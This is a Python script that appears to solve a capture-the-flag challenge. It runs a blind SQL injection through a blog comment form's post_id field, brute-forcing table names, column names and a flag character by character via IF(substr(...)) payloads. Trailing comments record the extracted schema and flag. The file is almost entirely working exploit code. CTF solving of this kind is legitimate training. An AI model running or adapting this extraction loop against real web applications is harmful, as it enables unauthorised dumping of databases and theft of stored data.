import requests

url = 'https://blog.pwning2017.p4.team/submit'


def payload_table(character, position, offset):
    return 'IF(substr((select table_name from information_schema.tables WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\' limit 1 offset ' + str(offset) + '),' + str(position) + ',1)=\'' + character + '\',1,2)'

def payload_column(character, position, offset):
    return 'IF(substr((select column_name from information_schema.columns WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\' limit 1 offset ' + str(offset) + '),' + str(position) + ',1)=\'' + character + '\',1,2)'

def payload_data(character, position, offset):
    return 'IF(substr((select flag from ctf_flag limit 1),' + str(position) + ',1)=\'' + character + '\',1,2)'


def dump(offset):
    res = ''
    pos = len(res) + 1
    request_counter = 0
    found = True

    while found:
        with requests.Session() as s:
            found = False
            req = s.get('https://blog.pwning2017.p4.team/')
            for ch in range(ord('}'), ord('!'), -1):
                request_verification = 'request_counter_' + str(request_counter)
                # data = {'post_id' : payload_table(chr(ch),pos, offset), 'who' : 'a', 'text' : request_verification}
                # data = {'post_id': payload_column(chr(ch), pos, offset), 'who': 'a', 'text': request_verification}
                data = {'post_id': payload_data(chr(ch), pos, offset), 'who': 'a', 'text': request_verification}
                headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

                req = s.post(url=url, data=data, headers=headers, allow_redirects=False)
                # print(req.status_code, data)
                req = s.get('https://blog.pwning2017.p4.team/')

                if req.text.find(request_verification) != -1:
                    res += chr(ch)
                    pos += 1
                    print(res)
                    found = True
                    break

                request_counter += 1
    return res

#table name: blog_comment,ctf_flag
#columns: id,instance,post_id,who,content,flag
#flag: pwn{blind_sqli_in_insert_kinda_fun}
dump(1)
